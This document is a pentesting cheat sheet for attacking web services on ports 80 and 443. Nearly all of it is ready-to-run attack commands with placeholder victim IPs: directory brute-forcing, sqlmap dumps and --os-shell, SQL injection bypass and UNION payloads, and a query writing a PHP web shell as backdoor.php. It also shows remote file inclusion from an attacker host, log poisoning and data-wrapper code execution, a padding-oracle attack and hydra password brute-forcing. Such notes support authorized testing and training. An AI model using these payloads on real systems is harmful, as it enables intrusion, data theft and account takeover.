# 80 / 443 - HTTP(S)

---

- [Enumeration](#enumeration)
- [Proxy Intercepter](#proxy-intercepter)
- [Vulnerability Scanning](#vulnerability-scanning)
- [SQL Injection](#sql-injection)
- [File Inclusion](#file-inclusion)
- [OS Command Injection](#os-command-injection)
- [Cross-Site Scripting (XSS)](#coss-site-scripting)
- [Cryptography](#cryptography)
- [Bruteforcing](#bruteforcing)

> {info} **HTTP** stands for **Hypertext Transfer Protocol (Secure)**

<a name="enumeration"></a>
## Enumeration
### Sitemaps
```sh
curl http://__VICTIM_IP__/robots.txt
curl http://__VICTIM_IP__/sitemap.xml
curl http://__VICTIM_IP__/sitemap/
```

### Directory / File Scanning
Common Wordlists
```sh
/usr/share/seclists/Discovery/Web-Content/common.txt
```
```sh
/usr/share/wfuzz/wordlist/general/common.txt
```
```sh
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Scan all the urls in the wordlist
```sh
gobuster dir --url=http://__VICTIM_IP__/ --wordlist=/usr/share/seclists/Discovery/Web-Content/common.txt
```

Use a wordlist with common names such as index.php incase it was accidently stored as txt eg index.php.txt. Repeat with various types of extensions.
```sh
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://__VICTIM_IP__/FUZZ.txt
```

Wordpress Plugins
```sh
gobuster dir --url=http://__VICTIM_IP__/ --wordlist=/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
```

Scan the website for folders / files
```sh
dirsearch --url=http://__VICTIM_IP__/ --extensions=*
```

Scan the website for folders / files
```sh
dirb http://__VICTIM_IP__/ -r
```

### Built With Scanners
```sh
wappalyzer http://__VICTIM_IP__/
```

Retrieves information about what technology a website is built with
```sh
https://builtwith.com/
```

(Windows) Retrieves information about what a website is built with
```sh
httprecon
```

Retrieves information about what a website is built with
```sh
httprint -h http://__VICTIM_IP__/ -s /opt/httprint/signatures.txt
```

### Generating Wordlist
Generate custom word list from the website content
```sh
cewl http://__VICTIM_IP__/ > cewl.txt
```

<a name="proxy-intercepter"></a>
## Proxy Intercepter
### Burp Suite
Pitchfork - Different payload for each position.

<a name="vulnerability-scanning"></a>
## Vulnerability Scanning
### Nikto
Scan the website for web vulnerabilities, -maxtime  Automatically stops scan after certain time, -T controls types of tests to run.
```sh
nikto --host http://__VICTIM_IP__/
```

### WP Scan
Wordpress scanner
```sh
wpscan --url http://__VICTIM_IP__/ --enumerate u,ap,tt,t
```

### Skipfish
skipfish

### Security Headers
Not vulnerabilities in and of themselves but can indicate that a website hasn't been hardened.
https://securityheaders.com

### SSL Server Test
Show if a website is vulnerable to SSL related vulnerabilities like Poodle or Heartbleed.
https://www.ssllabs.com/ssltest

<a name="sql-injection"></a>
## SQL Injection

### SQL Map
“-u” specifies url, “-p” specifies parameter to use.
```sh
sqlmap -u http://__VICTIM_IP__/debug.php?id=1 -p "id"
```

Force to use mysql and --dump to dump all the tables in the database. Outputs to screen and dumps to csv.
```sh
sqlmap -u http://__VICTIM_IP__/debug.php?id=1 -p "id" --dbms=mysql --dump
```

Attempts to gain a shell on the os.
```sh
sqlmap -u http://__VICTIM_IP__/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

### Authnetication Bypass
Sometimes an application may expect a single row, so you may have to limit the results to 1.
```sh
‘ OR ’1' = '1
' OR 1=1;#
' OR 1=1-- -
' OR 1=1 LIMIT 1;#
```

### Enumeration
Column count enumeration, keep incrementing order by 1 until an error occurs.
```sh
1 order by 1
```

Try union additional data with the correct number of columns to see if we can see the output.
```sh
1 union all select 1, 2, 3
```

Try view some information. (MySQL)
```sh
1 union all select 1, @@VERSION, user()
```

Table enumeration.
```sh
1 union all select 1, table_schema, table_name from information_schema.tables
```

Column enumeration
```sh
1 union all select 1, column_name, column_type from information_schema.columns where table_name = ‘users’
```

Selecting data from a table we found.
```sh
1 union all select 1, username, password from webappdb.users
```

### Code Execution
Read the hosts file on a windows machine.
```sh
1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

Write a file to a location.
```sh
1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

<a name="file-inclusion"></a>
## File Inclusion

- Linux - `/etc/passwd`
- Windows - `c:\windows\system32\drivers\etc\hosts`

### Remote File Inclusion (RFI)
Test for RFI by submitting a url.
```sh
curl 'http://__VICTIM_IP__/example.php?file=http://__ATTACKER_IP__/evil.txt'
```

### Log File Posioning
Contaminating Log File with user agent then running the cmd when viewing the log file.
```sh
curl --user-agent '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>' 'http://__VICTIM_IP__/example.php?file=c:\xampp\apache\logs\access.log&cmd=whoami'
```

### Data Wrapper
```sh
curl 'http://__VICTIM_IP__/example.php?file=data:text/plain,hello%20world'
```

Running PHP
```sh
curl 'http://__VICTIM_IP__/example.php?file=data:text/plain,%3C?php%20echo%20%27%3Cpre%3E%27%20.%20shell_exec(%27dir%27)%20.%20%27%3C/pre%3E%27;%20?%3E'
```

<a name="os-command-injection"></a>
## OS Command Injection
commix

<a name="coss-site-scripting"></a>
## Cross-Site Scripting (XSS)
BeEF

<a name="cryptography"></a>
## Cryptography
Decrypts a base64 encrypted value using Oracle padding attack. (Add -plaintext=value-to-encrypt to encrypt)
```s
padbuster http://__VICTIM_IP__/ ldqSKYv0mHL2TUMWu5qU0A%3D%3D 8 -cookies auth=ldqSKYv0mHL2TUMWu5qU0A%3D%3D -encoding 0
```

<a name="bruteforcing"></a>
## Bruteforcing
Http Brutefocing using username "admin" and a passwordlist, submitting it as a post request.
```sh
hydra -F -l admin -P /usr/share/wordlists/rockyou.txt.gz __VICTIM_IP__ http-post-form "/admin.php:username=^USER^&password=^PASS^:Incorrect username or password"
```
